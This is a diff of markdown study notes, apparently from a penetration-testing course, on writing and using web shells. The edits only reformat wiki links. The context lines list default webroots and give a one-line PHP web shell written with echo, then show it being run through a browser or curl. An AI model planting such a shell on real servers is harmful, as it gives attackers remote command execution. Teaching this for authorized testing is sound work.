@@ -30,10 +30,10 @@ First, identify the webroot directory. Common defaults include:
 
 | Web Server          | Default Webroot      |
 | ------------------- | -------------------- |
-| `[[Apache]]`        | `/var/www/html/`     |
-| `[[Nginx]]`         | `/usr/local/nginx/html/` |
-| `[[IIS]]`           | `c:\\inetpub\\wwwroot\\` |
-| `[[XAMPP]]`         | `C:\\xampp\\htdocs\\`    |
+| [[Apache]]        | `/var/www/html/`     |
+| [[Nginx]]         | `/usr/local/nginx/html/` |
+| [[IIS]]           | `c:\\inetpub\\wwwroot\\` |
+| [[XAMPP]]         | `C:\\xampp\\htdocs\\`    |
 
 Once the webroot is identified, use available command execution (e.g., `echo`) to write the shell script. For example, on a Linux host running Apache:
 
@@ -45,13 +45,13 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 
 ## Accessing a Web Shell
 
-After uploading, access the web shell using a browser or a tool like `[[cURL]]`. Append the command as a parameter (e.g., `?cmd=id`):
+After uploading, access the web shell using a browser or a tool like [[cURL]]. Append the command as a parameter (e.g., `?cmd=id`):
 
 Browser Example URL: `http://SERVER_IP:PORT/shell.php?cmd=id`
 
 ![UID, GID, and groups set to www-data.](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)
 
-Using `[[cURL]]`:
+Using [[cURL]]:
 
 ```shell-session
 Iskandeur@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
